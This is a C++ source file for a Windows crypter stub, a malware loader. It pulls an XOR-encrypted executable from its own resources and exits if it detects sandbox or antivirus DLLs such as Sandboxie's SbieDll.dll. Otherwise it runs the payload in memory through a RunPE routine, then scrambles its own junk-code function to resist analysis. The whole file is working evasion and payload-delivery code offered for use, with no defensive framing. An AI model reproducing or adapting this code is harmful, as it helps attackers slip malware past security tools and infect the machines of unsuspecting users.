#include <Windows.h>
#include <vector>
#include <string>
#include "../../Key.h"
#include "Runpe.h"

int GetRandom(int min, int max)
{
	long rnd = 0;
	_asm
	{
	osion:
		rdtsc
			xor eax, edx
			bswap eax
			mov rnd, eax
	}
	rnd = rnd % max;
	if (rnd < min)
		_asm call osion
	return rnd;
}

DWORD func_start1 = 0xFF;

DWORD func_end1 = 0xFFFFFF;

void Crytor()
{
	_asm
	{
		CALL next1
		next1 : pop func_start1
	}
	int a[5000], b[5000], c[5000];
	for (int i = 0; i < GetRandom(0, 200); i++)
	{
		if (i % 2 == 0)
		{
			a[i] = i - 1;
			b[i] = a[i] * rand();
			c[i] = GetRandom(1, 5120);
		}
		else
		{
			a[i] = i + 1;
			b[i] = rand();
			c[i] = a[i] * rand();
		}
	}
	for (int i = 0; i < GetRandom(0, 100); i++)
	{
		a[GetRandom(0, 50)] = b[GetRandom(0, 200)];
		a[GetRandom(10, 100)] = b[GetRandom(5, 900)];
		a[GetRandom(44, 456)] = b[GetRandom(456, 545)];
		a[GetRandom(250, 800)] = b[GetRandom(3830, 4000)];
		a[GetRandom(250, 520)] = b[GetRandom(235, 999)];
		b[GetRandom(865, 900)] = c[GetRandom(456, 2000)];
		b[GetRandom(456, 999)] = a[GetRandom(3000, 4999)];
	}
	int y = 0;
	while (y < GetRandom(0, 100))
	{
		a[y] = a[y + 1];
		y++;
	}
	y = 1;
	while (y < GetRandom(0, 200))
	{
		a[y - 1] = a[y + 1];
		y++;
	}
	y = rand();
	_asm
	{
		CALL next2
		next2 : pop func_end1
	}
}

void Crypt()
{
	Crytor();

	DWORD FuncSize = func_end1 - func_start1,
		OldProtect = 0x0,
		Ignore = 0x0,
		StartAddr = func_start1,
		xd = func_start1;

	VirtualProtect((LPVOID)StartAddr, FuncSize, PAGE_EXECUTE_READWRITE, &OldProtect);
	for (int i = 0; i < FuncSize; i++)
	{
		xd[(char*)0] = rand() % 54786;
		xd++;
	}
	VirtualProtect((LPVOID)StartAddr, FuncSize, OldProtect, &Ignore);
}


void ReadResource(int id, std::vector<unsigned char>& data)
{
	size_t sSize;

	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	sSize = SizeofResource(NULL, hResource);
	data.resize(sSize);
	memcpy((void*)data.data(), temp, sSize);
}

void XORCrypt(const std::string& key, std::vector<unsigned char>& bytes)
{
	for (int i = 0; i < bytes.size(); ++i)
		bytes[i] ^= key[i % sizeof(key)];
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	std::vector<unsigned char> file_bytes, settings;
	ReadResource(1, settings);

	if ((bool)settings[1])
		if (GetModuleHandle(XorStr("cmdvrt32.dll")) != 0 || GetModuleHandle(XorStr("SxIn.dll")) != 0 ||
			GetModuleHandle(XorStr("SbieDll.dll")) != 0 ||
			GetModuleHandle(XorStr("Sf2.dll")) != 0 || GetModuleHandle(XorStr("snxhk.dll")) != 0)
			return 0;

	ReadResource(2, file_bytes);
	XORCrypt(key, file_bytes);

	if (file_bytes.data())
	{
		if ((bool)settings[0])
			RunPortableExecutable(static_cast<void*>(file_bytes.data()), true);
		else
			RunPortableExecutable(static_cast<void*>(file_bytes.data()));
	}
	Crypt();
}